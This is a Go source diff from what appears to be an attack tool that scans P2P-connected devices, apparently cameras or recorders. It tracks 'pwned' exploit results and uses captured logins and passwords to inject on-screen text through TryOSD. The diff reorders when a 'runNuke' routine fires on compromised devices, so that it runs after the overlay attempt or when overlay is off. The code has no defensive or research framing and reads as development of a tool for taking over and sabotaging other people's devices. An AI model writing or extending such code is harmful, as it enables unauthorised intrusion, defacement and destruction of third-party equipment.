@@ -51,7 +51,8 @@ type Scanner struct {
 	pwnedList  []ExploitResult
 	cancelChan chan struct{}
 	hsSem      chan struct{}
-	provided   map[string]ProvidedCred
+	// ready credentials keyed by serial from serial:login:password input
+	provided map[string]ProvidedCred
 }
 
 const (
@@ -936,10 +937,10 @@ func (s *Scanner) launchExtras(serial string, tunnel *p2p.PTCPTunnel, res *Explo
 		if cleanup != nil {
 			defer cleanup()
 		}
-		if nukeOn {
-			runNuke(tunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, nukeOn)
-		}
 		if !osdOn {
+			if nukeOn {
+				runNuke(tunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, nukeOn)
+			}
 			return
 		}
 		redial := func() (*p2p.PTCPTunnel, func(), bool) {
@@ -948,9 +949,12 @@ func (s *Scanner) launchExtras(serial string, tunnel *p2p.PTCPTunnel, res *Explo
 		err := TryOSD(tunnel, res.Login, res.Password, channel, lines, redial)
 		if err != nil {
 			LogOSDResult(serial, 5000, false, err)
-			return
+		} else {
+			LogOSDResult(serial, 5000, true, nil)
 		}
-		LogOSDResult(serial, 5000, true, nil)
+		if nukeOn {
+			runNuke(tunnel, res.Login, res.Password, res.Channels, s.Config.Nuke, s.Config.Dummy.Login, serial, nukeOn)
+		}
 	}()
 }
 
